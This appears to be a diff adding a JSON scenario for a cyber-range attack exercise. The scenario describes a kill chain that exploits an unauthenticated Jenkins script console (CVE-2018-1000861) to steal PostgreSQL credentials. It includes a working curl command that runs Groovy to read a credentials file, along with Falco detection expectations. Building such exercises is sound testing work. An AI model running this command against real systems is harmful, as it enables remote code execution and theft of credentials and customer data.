@@ -1,0 +1,31 @@
+{
+  "_note": "핵심층 환경 — corp 킬체인 ★ 내부→크라운 전 자격증명 탈취. Jenkins 2.138 미인증 스크립트 콘솔 RCE(CVE-2018-1000861) → Groovy 로 /opt/deploy/corp-db.properties 읽어 크라운 DB 자격증명 수집. killchain-1(ShopFlow)과 같은 T1552.001 기법·다른 절차. 조건 문법은 postgres.json(canonical) 참고. 진행도 선저작.",
+  "env": "corp-jenkins-cred",
+  "technique": "T1552.001",
+  "cve": "CVE-2018-1000861",
+  "procedure": {
+    "id": "PROC-corp-jenkins-cred",
+    "name": "Jenkins 스크립트 콘솔 RCE→DB 자격증명 탈취",
+    "description": "미인증 접근 가능한 Jenkins(jenkins.corp-internal.svc.cluster.local:8080) 스크립트 콘솔(CVE-2018-1000861)로 임의 Groovy 를 실행해 배포 파일 /opt/deploy/corp-db.properties 를 읽고 크라운 PostgreSQL 자격증명(postgres:postgres@postgres.corp-crown)을 수집한다. ★수집한 자격증명의 최종 용도는 postgres.corp-crown 에 직접 접속해 customers·ops_secrets 를 SELECT 하는 것(T1213 크라운)이다.",
+    "status": "AUTHORED",
+    "steps": [
+      {"id": "STEP-corp-jenkins-groovy", "seq": 1,
+       "command": "curl -s 'http://jenkins.corp-internal.svc.cluster.local:8080/script' --data-urlencode 'script=println new File(\"/opt/deploy/corp-db.properties\").text'",
+       "description": "스크립트 콘솔 Groovy 로 corp-db.properties 읽기(CVE-2018-1000861)"}
+    ]
+  },
+  "preconditions": [
+    {"id": "PRE-corp-jenkins-console",
+     "name": "미인증 스크립트 콘솔 + 배포파일 존재",
+     "description": "내부 도달로 Jenkins 스크립트 콘솔에 인증 없이 접근 가능하고, /opt/deploy/corp-db.properties 에 평문 크라운 DB 자격증명이 보관돼 있음."}
+  ],
+  "expected_results": [
+    {"id": "ER-corp-jenkins-progress-cred",
+     "name": "크라운 DB 자격증명 수집 흔적 (진행도)",
+     "kind": "progress",
+     "outcome": {"id": "AO-credential-access", "name": "자격증명 수집"},
+     "conditions": [
+       {"channel": "falco", "field": "technique", "operator": "eq", "expected": "T1552.001"}
+     ]}
+  ]
+}
